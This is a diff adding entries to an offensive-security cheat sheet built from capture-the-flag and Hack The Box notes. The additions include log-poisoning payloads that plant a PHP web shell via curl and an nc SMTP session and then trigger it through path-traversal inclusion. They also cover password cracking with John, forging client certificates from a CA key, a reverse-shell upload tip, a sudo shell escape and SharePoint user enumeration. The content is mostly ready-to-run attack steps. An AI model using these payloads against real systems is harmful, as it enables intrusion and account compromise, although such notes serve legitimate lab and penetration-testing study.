@@ -478,6 +478,26 @@ DATA
 #RCE
 ?page=/var/log/mail&cmd=ls -la
 
+#-----[/var/log/apache2/access.log]-----
+curl http://10.10.10.10 -A '<?php system($_GET["cmd"]); ?>'
+
+#RCE
+?book=../../../../../../var/log/apache2/access.log&cmd=ls -la
+
+#-----[/var/mail/USER]-----
+nc 10.10.10.10 25
+
+HELO test
+MAIL FROM: www-data@solstice
+RCPT TO:www-data@solstice
+DATA
+<?php system($_GET["cmd"]); ?>
+.
+#RCE
+?book=../../../../../../var/mail/www-data&cmd=ls -la
+
+
+
 ======Windows======
 # Wordlists
 C:/windows/win.ini
@@ -782,6 +802,27 @@ https://github.com/unode/firefox_decrypt.git
 	* key4.db
 	* cert9.db
 - python3 firefox_decrypt.py /opt/Training/Gatekeeper/profile
+```
+
+### John The Ripper
+
+```bash
+# Pdf2john
+perl /usr/share/john/pdf2john.pl example.pdf > hash
+
+# Commands
+john hash --wordlist=rockyou.txt
+john hash --show
+```
+
+### Firefox Addons
+
+```bash
+# FoxyProxy
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+
+# X-Forwarded For Injector
+https://addons.mozilla.org/en-US/firefox/addon/x-forwarded-for-injector/
 ```
 
 ### Sshuttle
@@ -1187,6 +1228,37 @@ https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 ```
 
+### Generate client SSL Certificate
+
+```bash
+# Download server side certificate (Browser)
+- Click on the Lock icon in the url row > Show Connection Details > More Information > View Certificate > Download PEM (cert) > Save it as .crt
+
+# Check
+openssl pkey -in ca.key -pubout | md5sum
+openssl x509 -in lacasadepapel-htb.crt -pubkey -noout | md5sum
+
+- This will give the same md5sum output which is => 71e2b2ca7b610c24d132e3e4c06daf0c
+
+# Generate private key for SSL client
+openssl genrsa -out client.key 4096
+
+# Generate cert request
+openssl req -new -key client.key -out client.req
+
+# Issue client certificate
+openssl x509 -req -in client.req -CA lacasadepapel-htb.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
+
+# Convert to pkcs#12 format (Browser)
+openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
+
+# Clean (optional)
+rm client.key client.cer client.req
+
+# References
+https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/
+```
+
 ### Active Directory
 
 ```bash
@@ -1360,6 +1432,12 @@ https://github.com/GhostManager/Ghostwriter
 	{{ x }}
 {% endfor %}
 
+#====Example(2) Iteration====
+{% for x in list_web %}
+    {{ forloop.counter }} # starting index 1
+    {{ forloop.counter0 }} # starting index 0
+{% endfor %}
+
 #=====Example(1) IfElse=====
 {% if 'web' in x %}
 	yes
@@ -1435,6 +1513,18 @@ https://github.com/ajpc500/NimlineWhispers
 https://gist.github.com/ChoiSG/e0a7f5949638dfe363bcd418d94dcc34
 https://ilankalendarov.github.io/posts/nim-ransomware/
 https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/
+```
+
+### Cs
+
+```bash
+# Split By Whitespace and append every end words
+passPhrase = "aa bb cc dd ee ff";
+passPhrase = string.Join("\"" + Environment.NewLine + "\"", passPhrase.Split()
+	.Select((word, index) => new { word, index })
+	.GroupBy(x => x.index / 2)
+	.Select(grp => string.Join(" ", grp.Select(x => x.word))));
+	
 ```
 
 ### Bypass 403 (Forbidden)
@@ -1782,6 +1872,15 @@ getmyuid
 ```bash
 # Sudo
 sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+```
+
+### Folder (Suid)
+
+```bash
+- If there is a folder with SUID
+- And it is a webserver
+- Try to upload php reverse shell
+- Access it from web
 ```
 
 ### Cat
@@ -2443,13 +2542,34 @@ https://www.sourcecodester.com/php/12306/voting-system-using-php.html
 ### SharePoints
 
 ```bash
+# Wordlists
+locate sharepoint | grep txt
+/pathto/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
+/usr/share/dirb/wordlists/vulns/sharepoint.txt
+/usr/share/wfuzz/wordlist/vulns/sharepoint.txt
+/usr/share/windows-resources/powersploit/Recon/Dictionaries/sharepoint.txt
+
+# User Enumeration
+http://example.com/_layouts/userdisp.aspx?id=1
+http://example.com/_layouts/15/userdisp.aspx?id=1
+http://example.com/site/path/_layouts/15/userdisp.aspx?id=1
+http://example.com/site/path/_layouts/userdisp.aspx?id=1
+
+# Web Services
+http://example.com/_vti_bin/spsdisco.aspx
+
 # References
 https://hackingprofessional.github.io/HTB/Hacking-a-sharepoint-website/
 https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
-https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
 https://www.crummie5.club/the-lone-sharepoint/
 https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/
-
+https://www.defcon.org/images/defcon-11/dc-11-presentations/dc-11-Shannon/presentations/dc-11-shannon.pdf
+https://pentest-tools.com/public/sample-reports/sharepoint-scan-sample-report.pdf
+https://trojand.com/cheatsheet/Methodologies/Sharepoint.html
+http://sparty.secniche.org/
+https://hackmag.com/security/sharepoint-serving-the-hacker/
+https://github.com/helloitsliam/Hacking/blob/master/SharePoint-URLs
+https://github.com/bhasbor/SharePointURLBrute-v1.1/blob/master/SharePoint-UrlExtensions-18Mar2012.txt
 ```
 
 ### Rejetto File Server
